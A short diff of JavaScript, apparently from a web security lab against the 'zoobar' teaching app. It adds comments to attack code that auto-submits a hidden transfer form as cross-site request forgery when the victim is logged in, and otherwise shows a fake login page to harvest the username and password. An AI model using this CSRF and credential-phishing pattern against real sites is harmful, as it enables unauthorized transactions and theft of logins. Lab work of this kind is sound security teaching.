@@ -74,10 +74,12 @@ function loadReady(){
 }
 var div_value = document.getElementById("myZoobars").innerHTML;
 if(div_value){
+  <!--log in already, Cross Site Request Forgery-->
   document.getElementsByName("attackf")[0].addEventListener("load",loadReady,false);
   document.forms["transferform"].submit();
 }
 else{
+   <!--Not logged in, give a fake loggin page to get the password and username-->
    document.getElementsByName("loginform")[0].addEventListener("submit",emailPasswd,false);
 }
 
